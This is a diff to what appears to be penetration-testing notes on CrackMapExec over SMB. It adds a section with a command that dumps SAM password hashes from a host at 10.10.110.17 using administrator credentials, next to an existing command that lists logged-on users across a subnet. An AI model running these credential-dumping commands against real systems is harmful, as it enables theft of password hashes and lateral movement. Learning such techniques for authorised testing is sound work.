@@ -50,6 +50,13 @@ On a network with multiple machines. Some of them share the same local administ
 crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
 ```
 
+##### Extract Hashes from SAM Database
+
+ If we get administrative privileges on a machine, we can extract the SAM database hashes.
+
+```shell-session
+crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
+```
 ### Options
 
 ```shell-session
